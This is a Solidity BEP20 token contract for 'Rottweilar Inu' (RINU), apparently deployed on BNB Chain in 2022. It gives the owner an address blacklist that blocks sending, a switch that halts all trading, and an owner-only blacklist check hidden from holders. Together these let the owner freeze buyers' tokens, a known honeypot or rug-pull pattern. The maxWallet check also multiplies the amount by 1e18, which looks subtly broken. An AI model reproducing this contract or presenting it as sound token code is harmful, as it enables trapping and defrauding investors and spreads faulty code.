/**
 *Submitted for verification at BscScan.com on 2022-02-01
*/

/*
----------------------------------------------------------------------------
Rottweilar Inu Token Contract

 Symbol        : RINU
 Name          : Rottweilar Inu
 Total supply  : 1000000000000000
 Decimals      : 18
----------------------------------------------------------------------------
*/
// SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}
// -----------------------------------------------------------------------------------------------
interface IBEP20 {

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);
}
// -----------------------------------------------------------------------------------------------
abstract contract Ownable is Context {

    address private _owner;
    address private _previousOwner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        _transferOwnership(_msgSender());
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}
// -----------------------------------------------------------------------------------------------
contract RottweilarInu is Context, IBEP20, Ownable  {

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private blacklist;

    event Blacklisted(address account);
    event UnBlacklisted(address account);

    string private _name;
    string private _symbol;
    uint256 private _totalSupply;

    uint256 private maxWallet;

    bool public TradingStatus;

    constructor () Ownable() {
        _name = "Rottweilar Inu";
        _symbol = "RINU";
        _totalSupply = 1000000000000000 * 1e18;
        blacklist[owner()] = false;
        _balances[owner()] = _totalSupply;
        emit Transfer(address(0), owner(), _totalSupply);
        TradingStatus = true;
        maxWallet = _totalSupply * 2/100;
    }

    receive() external payable {}

    function name() public view virtual returns (string memory) {
        return _name;
    }

    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual returns (uint8) {
        return 18;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "Approve from the zero address");
        require(spender != address(0), "Approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);
        require(_allowances[sender][_msgSender()] >= amount, "Transfer amount exceeds allowance");
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()] - amount);
        return true;
    }

    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        require(TradingStatus, "Trading is not active.");
        require(!blacklist[sender], "Account is already blacklisted");
        require(amount > 0, "Transfer amount must be greater than zero");
        require(sender != address(0), "Transfer from the zero address");
        require(recipient != address(0), "Transfer to the zero address");
        require(balanceOf(recipient) + (amount * 1e18) <=  maxWallet, "Recipient address balance exceeds allowance");
        _beforeTokenTransfer(sender, recipient, amount);
        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "Transfer amount exceeds balance");
        _balances[sender] = senderBalance - amount;
        _balances[recipient] += amount;
        emit Transfer(sender, recipient, amount);
    }

    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual {}

    function EnableBlacklist(address account) public onlyOwner {
        require(!blacklist[account], "Account is already blacklisted");
        blacklist[account] = true;
        emit Blacklisted(account);
    }

    function DisableBlacklist(address account) public onlyOwner {
        require(blacklist[account], "Account is not blacklisted");
        blacklist[account] = false;
        emit UnBlacklisted(account);
    }

    function IsBlacklisted(address account) public onlyOwner view returns (bool) {
        return blacklist[account];
    }

    function TradingEnable() public onlyOwner {
        TradingStatus = true;
    }

    function TradingDisable() public onlyOwner {
        TradingStatus = false;
    }
}